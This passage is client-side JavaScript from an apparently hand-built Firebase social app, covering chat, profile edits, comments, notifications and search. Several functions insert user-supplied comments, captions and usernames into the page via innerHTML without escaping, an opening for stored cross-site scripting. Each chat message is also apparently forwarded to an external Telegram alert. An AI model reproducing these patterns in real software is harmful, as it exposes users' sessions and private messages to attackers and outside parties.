      const text = input.value.trim();
      if (!text) return;

      await db.collection("messages").add({
        text: text,
        senderId: currentUser.uid,
        senderUsername: currentUser.username,
        senderName: currentUser.fullName,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      });

      sendTelegramAlert(`New Message from @${currentUser.username}: "${text}"`);
      input.value = "";
    }

    async function saveProfileUpdates() {
      const name = document.getElementById("editProfileName").value.trim();
      const username = document.getElementById("editProfileUserId").value.trim().toLowerCase();
      const dob = document.getElementById("editProfileDob").value;
      const bio = document.getElementById("editProfileBio").value.trim();
      const newPass = document.getElementById("editProfileNewPassword").value.trim();

      if (!name || !username) {
        alert("Name and User ID cannot be empty!");
        return;
      }

      // Check unique username if altered
      if (username !== currentUser.username) {
        const check = await db.collection("users").where("username", "==", username).get();
        if (!check.empty) {
          alert("already exists");
          return;
        }
      }

      const updates = { fullName: name, username: username, dob: dob, bio: bio };
      await db.collection("users").doc(currentUser.uid).update(updates);
      currentUser = { ...currentUser, ...updates };

      if (newPass && newPass.length >= 6) {
        auth.currentUser.updatePassword(newPass).catch(e => alert("Password update requires recent login: " + e.message));
      }

      document.getElementById("userFullnameLabel").innerText = name;
      document.getElementById("userHandleLabel").innerText = "@" + username;
      document.getElementById("userBioLabel").innerText = bio;

      closeModal("editProfileDialog");
      alert("Profile updated successfully!");
    }

    async function loadUserGridPosts() {
      const grid = document.getElementById("userGridPostsContainer");
      const countLabel = document.getElementById("userPostsCount");
      const snap = await db.collection("posts").where("authorId", "==", currentUser.uid).get();

      grid.innerHTML = "";
      countLabel.innerText = snap.size;

      snap.forEach(doc => {
        const p = doc.data();
        const item = document.createElement("div");
        item.className = "grid-feed-item";
        item.innerHTML = p.mediaType === "video" 
          ? `<video src="${p.mediaUrl}"></video>` 
          : `<img src="${p.mediaUrl}">`;
        grid.appendChild(item);
      });
    }

    // --- 12. NOTIFICATIONS & COMMENTS ---
    function initNotificationsSubscription() {
      db.collection("notifications").where("receiverId", "==", currentUser.uid).limitToLast(20).onSnapshot(snap => {
        const box = document.getElementById("notificationsListBox");
        box.innerHTML = "";
        if (snap.empty) {
          box.innerHTML = '<p style="font-size:0.85rem; color:var(--text-secondary);">No new notifications.</p>';
          return;
        }
        snap.forEach(d => {
          const n = d.data();
          const item = document.createElement("div");
          item.style.padding = "8px 0";
          item.style.borderBottom = "1px solid var(--border)";
          item.style.fontSize = "0.85rem";
          item.innerText = n.text;
          box.appendChild(item);
        });
      });
    }

    function openCommentsDrawer(postId) {
      activeCommentPostId = postId;
      document.getElementById("commentsDrawer").classList.add("show");
      loadCommentsList(postId);
    }

    function closeCommentsDrawer() {
      document.getElementById("commentsDrawer").classList.remove("show");
      activeCommentPostId = null;
    }

    function loadCommentsList(postId) {
      const wrapper = document.getElementById("commentsListWrapper");
      wrapper.innerHTML = "";
      db.collection("posts").doc(postId).collection("comments").orderBy("createdAt", "asc").onSnapshot(snap => {
        wrapper.innerHTML = "";
        snap.forEach(doc => {
          const c = doc.data();
          const row = document.createElement("div");
          row.className = "comment-unit";
          row.innerHTML = `<strong>@${c.username}</strong> ${c.text}`;
          wrapper.appendChild(row);
        });
      });
    }

    async function postCommentAction() {
      const input = document.getElementById("newCommentInput");
      const text = input.value.trim();
      if (!text || !activeCommentPostId) return;

      await db.collection("posts").doc(activeCommentPostId).collection("comments").add({
        username: currentUser.username,
        text: text,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      });

      input.value = "";
    }

    // --- 13. NAVIGATION TAB ROUTER ---
    function switchMainTab(tab) {
      document.getElementById("feedSection").style.display = tab === 'feed' ? 'block' : 'none';
      document.getElementById("searchSection").style.display = tab === 'search' ? 'block' : 'none';
      document.getElementById("chatSection").style.display = tab === 'chat' ? 'flex' : 'none';
      document.getElementById("profileSection").style.display = tab === 'profile' ? 'block' : 'none';
      document.getElementById("notifSection").style.display = tab === 'notifications' ? 'block' : 'none';

      document.querySelectorAll(".nav-icon").forEach(icon => icon.classList.remove("active"));
      if (tab === 'feed') document.getElementById("navItemHome").classList.add("active");
      if (tab === 'search') document.getElementById("navItemSearch").classList.add("active");
      if (tab === 'profile') document.getElementById("navItemProfile").classList.add("active");
    }

    async function filterMediaSearch(term) {
      const q = term.trim().toLowerCase();
      const res = document.getElementById("searchListResults");
      res.innerHTML = "";
      if (!q) return;

      const snap = await db.collection("posts").get();
      snap.forEach(doc => {
        const post = doc.data();
        if ((post.caption && post.caption.toLowerCase().includes(q)) || 
            (post.authorUsername && post.authorUsername.toLowerCase().includes(q))) {
          const item = document.createElement("div");
          item.style.padding = "8px";
          item.style.background = "#181818";
          item.style.borderRadius = "6px";
          item.innerHTML = `<strong>@${post.authorUsername}</strong>: ${post.caption || 'Media Post'}`;
          res.appendChild(item);
        }
      });
    }

    function closeModal(id) {
      document.getElementById(id).classList.remove("show");
    }
  </script>
</body>
</html>
